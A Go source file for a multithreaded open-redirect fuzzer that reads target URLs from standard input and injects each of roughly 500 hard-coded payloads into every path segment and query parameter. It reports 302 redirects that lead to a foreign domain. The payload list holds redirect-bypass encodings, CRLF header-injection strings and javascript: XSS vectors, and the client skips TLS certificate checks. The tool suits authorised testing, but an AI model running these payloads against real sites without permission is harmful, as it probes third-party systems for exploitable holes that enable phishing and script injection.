package main

import (
	"fmt"
	"net"
	"net/http"
	"crypto/tls"
	"bufio"
	"net/url"
	"time"
	"sync"
	"os"
	"strings"
	"github.com/jpillora/go-tld"
)

var payloads = [503]string{`&%0d%0a1Location:https://google.com`,`@google.com`,`@https://www.google.com`,`%2f%2e%2e`,`crlftest%0dLocation:https://google.com`,`/https:/%5cblackfan.ru/`,`//example.com@google.com/%2f..`,`///google.com/%2f..`,`///example.com@google.com/%2f..`,`////google.com/%2f..`,`////example.com@google.com/%2f..`,`/x:1/:///%01javascript:alert(document.cookie)/`,`https://google.com/%2f..`,`https://example.com@google.com/%2f..`,`/https://google.com/%2f..`,`/https://example.com@google.com/%2f.//example.com@google.com/%2f..`,`///google.com/%2f..`,`///example.com@google.com/%2f..`,`////google.com/%2f..`,`////example.com@google.com/%2f..`,`https://google.com/%2f..`,`https://example.com@google.com/%2f..`,`/https://google.com/%2f..`,`/https://example.com@google.com/%2f..`,`//google.com/%2f%2e%2e`,`//example.com@google.com/%2f%2e%2e`,`///google.com/%2f%2e%2e`,`///example.com@google.com/%2f%2e%2e`,`////google.com/%2f%2e%2e`,`////example.com@google.com/%2f%2e%2e`,`https://google.com/%2f%2e%2e`,`https://example.com@google.com/%2f%2e%2e`,`/https://google.com/%2f%2e%2e`,`/https://example.com@google.com/%2f%2e%2e`,`//google.com/`,`//example.com@google.com/`,`///google.com/`,`///example.com@google.com/`,`////google.com/`,`////example.com@google.com/`,`https://google.com/`,`https://example.com@google.com/`,`/https://google.com/`,`/https://example.com@google.com/`,`//google.com//`,`//example.com@google.com//`,`///google.com//`,`///example.com@google.com//`,`////google.com//`,`////example.com@google.com//`,`https://google.com//`,`https://example.com@google.com//`,`//https://google.com//`,`//https://example.com@google.com//`,`//google.com/%2e%2e%2f`,`//example.com@google.com/%2e%2e%2f`,`///google.com/%2e%2e%2f`,`///example.com@google.com/%2e%2e%2f`,`////google.com/%2e%2e%2f`,`////example.com@google.com/%2e%2e%2f`,`https://google.com/%2e%2e%2f`,`https://example.com@google.com/%2e%2e%2f`,`//https://google.com/%2e%2e%2f`,`//https://example.com@google.com/%2e%2e%2f`,`///google.com/%2e%2e`,`///example.com@google.com/%2e%2e`,`////google.com/%2e%2e`,`////example.com@google.com/%2e%2e`,`https:///google.com/%2e%2e`,`https:///example.com@google.com/%2e%2e`,`//https:///google.com/%2e%2e`,`//example.com@https:///google.com/%2e%2e`,`/https://google.com/%2e%2e`,`/https://example.com@google.com/%2e%2e`,`///google.com/%2f%2e%2e`,`///example.com@google.com/%2f%2e%2e`,`////google.com/%2f%2e%2e`,`////example.com@google.com/%2f%2e%2e`,`https:///google.com/%2f%2e%2e`,`https:///example.com@google.com/%2f%2e%2e`,`/https://google.com/%2f%2e%2e`,`/https://example.com@google.com/%2f%2e%2e`,`/https:///google.com/%2f%2e%2e`,`/https:///example.com@google.com/%2f%2e%2e`,`/%09/google.com`,`/%09/example.com@google.com`,`//%09/google.com`,`//%09/example.com@google.com`,`///%09/google.com`,`///%09/example.com@google.com`,`////%09/google.com`,`////%09/example.com@google.com`,`https://%09/google.com`,`https://%09/example.com@google.com`,`/%5cgoogle.com`,`/%5cexample.com@google.com`,`//%5cgoogle.com`,`//%5cexample.com@google.com`,`///%5cgoogle.com`,`///%5cexample.com@google.com`,`////%5cgoogle.com`,`////%5cexample.com@google.com`,`https://%5cgoogle.com`,`https://%5cexample.com@google.com`,`/https://%5cgoogle.com`,`/https://%5cexample.com@google.com`,`https://google.com`,`https://example.com@google.com`,`//google.com`,`https:google.com`,`//google%E3%80%82com`,`\/\/google.com/`,`/\/google.com/`,`//google%00.com`,`https://example.com/https://google.com/`,`http://0xd8.0x3a.0xd6.0xce`,`http://example.com@0xd8.0x3a.0xd6.0xce`,`http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce`,`http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce`,`http://0xd83ad6ce`,`http://example.com@0xd83ad6ce`,`http://3H6k7lIAiqjfNeN@0xd83ad6ce`,`http://XY>.7d8T\205pZM@0xd83ad6ce`,`http://3627734734`,`http://example.com@3627734734`,`http://3H6k7lIAiqjfNeN@3627734734`,`http://XY>.7d8T\205pZM@3627734734`,`http://472.314.470.462`,`http://example.com@472.314.470.462`,`http://3H6k7lIAiqjfNeN@472.314.470.462`,`http://XY>.7d8T\205pZM@472.314.470.462`,`http://0330.072.0326.0316`,`http://example.com@0330.072.0326.0316`,`http://3H6k7lIAiqjfNeN@0330.072.0326.0316`,`http://XY>.7d8T\205pZM@0330.072.0326.0316`,`http://00330.00072.0000326.00000316`,`http://example.com@00330.00072.0000326.00000316`,`http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316`,`http://XY>.7d8T\205pZM@00330.00072.0000326.00000316`,`http://[::216.58.214.206]`,`http://example.com@[::216.58.214.206]`,`http://3H6k7lIAiqjfNeN@[::216.58.214.206]`,`http://XY>.7d8T\205pZM@[::216.58.214.206]`,`http://[::ffff:216.58.214.206]`,`http://example.com@[::ffff:216.58.214.206]`,`http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]`,`http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]`,`http://0xd8.072.54990`,`http://example.com@0xd8.072.54990`,`http://3H6k7lIAiqjfNeN@0xd8.072.54990`,`http://XY>.7d8T\205pZM@0xd8.072.54990`,`http://0xd8.3856078`,`http://example.com@0xd8.3856078`,`http://3H6k7lIAiqjfNeN@0xd8.3856078`,`http://XY>.7d8T\205pZM@0xd8.3856078`,`http://00330.3856078`,`http://example.com@00330.3856078`,`http://3H6k7lIAiqjfNeN@00330.3856078`,`http://XY>.7d8T\205pZM@00330.3856078`,`http://00330.0x3a.54990`,`http://example.com@00330.0x3a.54990`,`http://3H6k7lIAiqjfNeN@00330.0x3a.54990`,`http://XY>.7d8T\205pZM@00330.0x3a.54990`,`http:0xd8.0x3a.0xd6.0xce`,`http:example.com@0xd8.0x3a.0xd6.0xce`,`http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce`,`http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce`,`http:0xd83ad6ce`,`http:example.com@0xd83ad6ce`,`http:3H6k7lIAiqjfNeN@0xd83ad6ce`,`http:XY>.7d8T\205pZM@0xd83ad6ce`,`http:3627734734`,`http:example.com@3627734734`,`http:3H6k7lIAiqjfNeN@3627734734`,`http:XY>.7d8T\205pZM@3627734734`,`http:472.314.470.462`,`http:example.com@472.314.470.462`,`http:3H6k7lIAiqjfNeN@472.314.470.462`,`http:XY>.7d8T\205pZM@472.314.470.462`,`http:0330.072.0326.0316`,`http:example.com@0330.072.0326.0316`,`http:3H6k7lIAiqjfNeN@0330.072.0326.0316`,`http:XY>.7d8T\205pZM@0330.072.0326.0316`,`http:00330.00072.0000326.00000316`,`http:example.com@00330.00072.0000326.00000316`,`http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316`,`http:XY>.7d8T\205pZM@00330.00072.0000326.00000316`,`http:[::216.58.214.206]`,`http:example.com@[::216.58.214.206]`,`http:3H6k7lIAiqjfNeN@[::216.58.214.206]`,`http:XY>.7d8T\205pZM@[::216.58.214.206]`,`http:[::ffff:216.58.214.206]`,`http:example.com@[::ffff:216.58.214.206]`,`http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]`,`http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]`,`http:0xd8.072.54990`,`http:example.com@0xd8.072.54990`,`http:3H6k7lIAiqjfNeN@0xd8.072.54990`,`http:XY>.7d8T\205pZM@0xd8.072.54990`,`http:0xd8.3856078`,`http:example.com@0xd8.3856078`,`http:3H6k7lIAiqjfNeN@0xd8.3856078`,`http:XY>.7d8T\205pZM@0xd8.3856078`,`http:00330.3856078`,`http:example.com@00330.3856078`,`http:3H6k7lIAiqjfNeN@00330.3856078`,`http:XY>.7d8T\205pZM@00330.3856078`,`http:00330.0x3a.54990`,`http:example.com@00330.0x3a.54990`,`http:3H6k7lIAiqjfNeN@00330.0x3a.54990`,`http:XY>.7d8T\205pZM@00330.0x3a.54990`,`〱google.com`,`〵google.com`,`ゝgoogle.com`,`ーgoogle.com`,`ｰgoogle.com`,`/〱google.com`,`/〵google.com`,`/ゝgoogle.com`,`/ーgoogle.com`,`/ｰgoogle.com`,`%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d`,`http://%67%6f%6f%67%6c%65%2e%63%6f%6d`,`<>//google.com`,`//google.com\@example.com`,`https://:@google.com\@example.com`,`http://google.com:80#@example.com/`,`http://google.com:80?@example.com/`,`http://3H6k7lIAiqjfNeN@example.com+@google.com/`,`http://XY>.7d8T\205pZM@example.com+@google.com/`,`http://3H6k7lIAiqjfNeN@example.com@google.com/`,`http://XY>.7d8T\205pZM@example.com@google.com/`,`http://example.com+&@google.com#+@example.com/`,`http://google.com\texample.com/`,`//google.com:80#@example.com/`,`//google.com:80?@example.com/`,`//3H6k7lIAiqjfNeN@example.com+@google.com/`,`//XY>.7d8T\205pZM@example.com+@google.com/`,`//3H6k7lIAiqjfNeN@example.com@google.com/`,`//XY>.7d8T\205pZM@example.com@google.com/`,`//example.com+&@google.com#+@example.com/`,`//google.com\texample.com/`,`//;@google.com`,`http://;@google.com`,`@google.com`,`http://google.com%2f%2f.example.com/`,`http://google.com%5c%5c.example.com/`,`http://google.com%3F.example.com/`,`http://google.com%23.example.com/`,`http://example.com:80%40google.com/`,`http://example.com%2egoogle.com/`,`/https:/%5cgoogle.com/`,`/http://google.com`,`/%2f%2fgoogle.com`,`/google.com/%2f%2e%2e`,`/http:/google.com`,`/.google.com`,`///\;@google.com`,`///google.com`,`/////google.com/`,`/////google.com`,`//google.com/%2f%2e%2e`,`//example.com@google.com/%2f%2e%2e`,`///google.com/%2f%2e%2e`,`///example.com@google.com/%2f%2e%2e`,`////google.com/%2f%2e%2e`,`////example.com@google.com/%2f%2e%2e`,`https://google.com/%2f%2e%2e`,`https://example.com@google.com/%2f%2e%2e`,`/https://google.com/%2f%2e%2e`,`/https://example.com@google.com/%2f%2e%2e`,`//google.com/`,`//example.com@google.com/`,`///google.com/`,`///example.com@google.com/`,`////google.com/`,`////example.com@google.com/`,`https://google.com/`,`https://example.com@google.com/`,`/https://google.com/`,`/https://example.com@google.com/`,`//google.com//`,`//example.com@google.com//`,`///google.com//`,`///example.com@google.com//`,`////google.com//`,`////example.com@google.com//`,`https://google.com//`,`https://example.com@google.com//`,`//https://google.com//`,`//https://example.com@google.com//`,`//google.com/%2e%2e%2f`,`//example.com@google.com/%2e%2e%2f`,`///google.com/%2e%2e%2f`,`///example.com@google.com/%2e%2e%2f`,`////google.com/%2e%2e%2f`,`////example.com@google.com/%2e%2e%2f`,`https://google.com/%2e%2e%2f`,`https://example.com@google.com/%2e%2e%2f`,`//https://google.com/%2e%2e%2f`,`//https://example.com@google.com/%2e%2e%2f`,`///google.com/%2e%2e`,`///example.com@google.com/%2e%2e`,`////google.com/%2e%2e`,`////example.com@google.com/%2e%2e`,`https:///google.com/%2e%2e`,`https:///example.com@google.com/%2e%2e`,`//https:///google.com/%2e%2e`,`//example.com@https:///google.com/%2e%2e`,`/https://google.com/%2e%2e`,`/https://example.com@google.com/%2e%2e`,`///google.com/%2f%2e%2e`,`///example.com@google.com/%2f%2e%2e`,`////google.com/%2f%2e%2e`,`////example.com@google.com/%2f%2e%2e`,`https:///google.com/%2f%2e%2e`,`https:///example.com@google.com/%2f%2e%2e`,`/https://google.com/%2f%2e%2e`,`/https://example.com@google.com/%2f%2e%2e`,`/https:///google.com/%2f%2e%2e`,`/https:///example.com@google.com/%2f%2e%2e`,`/%09/google.com`,`/%09/example.com@google.com`,`//%09/google.com`,`//%09/example.com@google.com`,`///%09/google.com`,`///%09/example.com@google.com`,`////%09/google.com`,`////%09/example.com@google.com`,`https://%09/google.com`,`https://%09/example.com@google.com`,`/%5cgoogle.com`,`/%5cexample.com@google.com`,`//%5cgoogle.com`,`//%5cexample.com@google.com`,`///%5cgoogle.com`,`///%5cexample.com@google.com`,`////%5cgoogle.com`,`////%5cexample.com@google.com`,`https://%5cgoogle.com`,`https://%5cexample.com@google.com`,`/https://%5cgoogle.com`,`/https://%5cexample.com@google.com`,`https://google.com`,`https://example.com@google.com`,`//google.com`,`https:google.com`,`//google%E3%80%82com`,`\/\/google.com/`,`/\/google.com/`,`//google%00.com`,`https://example.com/https://google.com/`,`javascript://example.com?%a0alert%281%29`,`http://0xd8.0x3a.0xd6.0xce`,`http://example.com@0xd8.0x3a.0xd6.0xce`,`http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce`,`http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce`,`http://0xd83ad6ce`,`http://example.com@0xd83ad6ce`,`http://3H6k7lIAiqjfNeN@0xd83ad6ce`,`http://XY>.7d8T\205pZM@0xd83ad6ce`,`http://3627734734`,`http://example.com@3627734734`,`http://3H6k7lIAiqjfNeN@3627734734`,`http://XY>.7d8T\205pZM@3627734734`,`http://472.314.470.462`,`http://example.com@472.314.470.462`,`http://3H6k7lIAiqjfNeN@472.314.470.462`,`http://XY>.7d8T\205pZM@472.314.470.462`,`http://0330.072.0326.0316`,`http://example.com@0330.072.0326.0316`,`http://3H6k7lIAiqjfNeN@0330.072.0326.0316`,`http://XY>.7d8T\205pZM@0330.072.0326.0316`,`http://00330.00072.0000326.00000316`,`http://example.com@00330.00072.0000326.00000316`,`http://3H6k7lIAiqjfNeN@00330.00072.0000326.00000316`,`http://XY>.7d8T\205pZM@00330.00072.0000326.00000316`,`http://[::216.58.214.206]`,`http://example.com@[::216.58.214.206]`,`http://3H6k7lIAiqjfNeN@[::216.58.214.206]`,`http://XY>.7d8T\205pZM@[::216.58.214.206]`,`http://[::ffff:216.58.214.206]`,`http://example.com@[::ffff:216.58.214.206]`,`http://3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]`,`http://XY>.7d8T\205pZM@[::ffff:216.58.214.206]`,`http://0xd8.072.54990`,`http://example.com@0xd8.072.54990`,`http://3H6k7lIAiqjfNeN@0xd8.072.54990`,`http://XY>.7d8T\205pZM@0xd8.072.54990`,`http://0xd8.3856078`,`http://example.com@0xd8.3856078`,`http://3H6k7lIAiqjfNeN@0xd8.3856078`,`http://XY>.7d8T\205pZM@0xd8.3856078`,`http://00330.3856078`,`http://example.com@00330.3856078`,`http://3H6k7lIAiqjfNeN@00330.3856078`,`http://XY>.7d8T\205pZM@00330.3856078`,`http://00330.0x3a.54990`,`http://example.com@00330.0x3a.54990`,`http://3H6k7lIAiqjfNeN@00330.0x3a.54990`,`http://XY>.7d8T\205pZM@00330.0x3a.54990`,`http:0xd8.0x3a.0xd6.0xce`,`http:example.com@0xd8.0x3a.0xd6.0xce`,`http:3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce`,`http:XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce`,`http:0xd83ad6ce`,`http:example.com@0xd83ad6ce`,`http:3H6k7lIAiqjfNeN@0xd83ad6ce`,`http:XY>.7d8T\205pZM@0xd83ad6ce`,`http:3627734734`,`http:example.com@3627734734`,`http:3H6k7lIAiqjfNeN@3627734734`,`http:XY>.7d8T\205pZM@3627734734`,`http:472.314.470.462`,`http:example.com@472.314.470.462`,`http:3H6k7lIAiqjfNeN@472.314.470.462`,`http:XY>.7d8T\205pZM@472.314.470.462`,`http:0330.072.0326.0316`,`http:example.com@0330.072.0326.0316`,`http:3H6k7lIAiqjfNeN@0330.072.0326.0316`,`http:XY>.7d8T\205pZM@0330.072.0326.0316`,`http:00330.00072.0000326.00000316`,`http:example.com@00330.00072.0000326.00000316`,`http:3H6k7lIAiqjfNeN@00330.00072.0000326.00000316`,`http:XY>.7d8T\205pZM@00330.00072.0000326.00000316`,`http:[::216.58.214.206]`,`http:example.com@[::216.58.214.206]`,`http:3H6k7lIAiqjfNeN@[::216.58.214.206]`,`http:XY>.7d8T\205pZM@[::216.58.214.206]`,`http:[::ffff:216.58.214.206]`,`http:example.com@[::ffff:216.58.214.206]`,`http:3H6k7lIAiqjfNeN@[::ffff:216.58.214.206]`,`http:XY>.7d8T\205pZM@[::ffff:216.58.214.206]`,`http:0xd8.072.54990`,`http:example.com@0xd8.072.54990`,`http:3H6k7lIAiqjfNeN@0xd8.072.54990`,`http:XY>.7d8T\205pZM@0xd8.072.54990`,`http:0xd8.3856078`,`http:example.com@0xd8.3856078`,`http:3H6k7lIAiqjfNeN@0xd8.3856078`,`http:XY>.7d8T\205pZM@0xd8.3856078`,`http:00330.3856078`,`http:example.com@00330.3856078`,`http:3H6k7lIAiqjfNeN@00330.3856078`,`http:XY>.7d8T\205pZM@00330.3856078`,`http:00330.0x3a.54990`,`http:example.com@00330.0x3a.54990`,`http:3H6k7lIAiqjfNeN@00330.0x3a.54990`,`http:XY>.7d8T\205pZM@00330.0x3a.54990`,`〱google.com`,`〵google.com`,`ゝgoogle.com`,`ーgoogle.com`,`ｰgoogle.com`,`/〱google.com`,`/〵google.com`,`/ゝgoogle.com`,`/ーgoogle.com`,`/ｰgoogle.com`,`%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d`,`http://%67%6f%6f%67%6c%65%2e%63%6f%6d`,`<>javascript:alert(1);`,`<>//google.com`,`//google.com\@example.com`,`https://:@google.com\@example.com`,`ja\nva\tscript\r:alert(1)`,`\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)`,`\152\141\166\141\163\143\162\151\160\164\072alert(1)`,`http://google.com:80#@example.com/`,`http://google.com:80?@example.com/`,`http://3H6k7lIAiqjfNeN@example.com+@google.com/`,`http://XY>.7d8T\205pZM@example.com+@google.com/`,`http://3H6k7lIAiqjfNeN@example.com@google.com/`,`http://XY>.7d8T\205pZM@example.com@google.com/`,`http://example.com+&@google.com#+@example.com/`,`http://google.com\texample.com/`,`//google.com:80#@example.com/`,`//google.com:80?@example.com/`,`//3H6k7lIAiqjfNeN@example.com+@google.com/`,`//XY>.7d8T\205pZM@example.com+@google.com/`,`//3H6k7lIAiqjfNeN@example.com@google.com/`,`//XY>.7d8T\205pZM@example.com@google.com/`,`//example.com+&@google.com#+@example.com/`,`//google.com\texample.com/`,`//;@google.com`,`http://;@google.com`,`javascript://https://example.com/?z=%0Aalert(1)`,`http://google.com%2f%2f.example.com/`,`http://google.com%5c%5c.example.com/`,`http://google.com%3F.example.com/`,`http://google.com%23.example.com/`,`http://example.com:80%40google.com/`,`http://example.com%2egoogle.com/`,`/https:/%5cgoogle.com/`,`/http://google.com`,`/%2f%2fgoogle.com`,`/google.com/%2f%2e%2e`,`/http:/google.com`,`/.google.com`,`///\;@google.com`,`///google.com`,`/////google.com/`,`/////google.com`}

func main(){
	var wg sync.WaitGroup
	jobs := make(chan string)
	for i := 0 ; i < 30; i++ {
		wg.Add(1)
		go func(){
			for link := range jobs{
				ur := parseUri(link)
				if ur != "invalid url"{
					redirectScan(link,ur)
				}
			}
			wg.Done()
		}()
	}

	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		jobs <- sc.Text()
	}

	close(jobs)

	wg.Wait()
}

func redirectScan(link string,fuzz_url string){
	injectCount := strings.Count(fuzz_url,"FUZZ")
	for i := 1; i <= injectCount; i++ {
		u := strings.Replace(fuzz_url,"FUZZ","INJECT",1)
		nu := strings.ReplaceAll(u,"FUZZ","")
		var pg sync.WaitGroup
		for p := range payloads{
			pg.Add(1)
			go func(link string,main_u string){
				pay_url := strings.Replace(link,"INJECT",payloads[p],1)
				CheckRedirect(pay_url,main_u)
				pg.Done()
			}(nu,link)
		}
		pg.Wait()

		fuzz_url = strings.Replace(fuzz_url,"FUZZ","",1)
	}
}

func CheckRedirect(uri string,link string){
	colorGreen := "\033[32m"
	colorReset := "\033[0m"
	c := newClient()
	req,err := http.NewRequest("GET",uri,nil)
	if err != nil {
		return
	}
	resp,err := c.Do(req)
	if err != nil {
		return
	}
	if resp.StatusCode == 302 {
		location := resp.Header.Get("Location")
		u,err := tld.Parse(location)
		if err != nil {
			return
		}
		redirect_subd := u.Domain + "." + u.TLD
		mu,_ := tld.Parse(link)
		link_subd := mu.Domain + "." + mu.TLD
		if redirect_subd != link_subd && redirect_subd != "" {
			fmt.Println("Redirection 302 at",uri,"to:",string(colorGreen),location,string(colorReset))
			return
		}
		return
	} else {
		return
	}

}


func parseUri(uri string) string{
	u,err := url.Parse(uri)
	if err != nil {
		return "invalid url"
	}
	var new_uri string
	new_uri = u.Scheme + "://" + u.Host 
	if u.Path != "/" {
		path := strings.Split(u.Path,"/")
		newpath := path[1:]
		for p := range newpath {
			new_uri += "/"+ newpath[p] + "FUZZ"
		}
	}
	 if u.RawQuery != "" {
	 	new_uri += "?"
        q := u.Query()
        for k,_ := range q {
        	val := strings.Trim(fmt.Sprint(q[k]), "[]")
        	new_uri += k + "=" + val + "FUZZ&"
        } 
    }
    return new_uri
}

func newClient() *http.Client {

	tr := &http.Transport{
		MaxIdleConns:    30,
		IdleConnTimeout: time.Second,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	return &http.Client{
		Transport:     tr,
		CheckRedirect: re,
		Timeout:       time.Second * 10,
	}

}
